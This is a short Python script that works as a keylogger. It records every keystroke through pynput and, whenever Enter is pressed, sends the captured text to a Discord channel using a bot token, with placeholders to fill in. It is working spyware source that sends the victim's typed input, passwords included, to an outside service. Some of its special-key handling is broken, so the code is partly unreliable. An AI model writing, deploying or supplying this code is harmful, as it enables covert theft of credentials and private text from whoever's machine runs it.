import discord  
from pynput import keyboard

intents = discord.Intents.default()
client = discord.Client(intents=intents)
str_msg = []

def on_press(key):
    global str_msg

    try:
        str_msg.append(key.char)
    except AttributeError:
        if key == keyboard.Key.backspace:
            str_msg.pop()
        if key == keyboard.Key.enter:
            channel = client.get_channel(0) # Change 0 to your channel ID.
            client.loop.create_task(channel.send(''.join(str_msg)))
            str_msg = []
            return
            
        str_msg.append(str(key.char) + " ") # Remove this line if you don't wanna log special chars.

@client.event
async def on_ready():
    print(f"Logged in as {client.user}")

with keyboard.Listener(on_press=on_press) as listener:
    client.run("TOKEN") # Change token.
    listener.join()
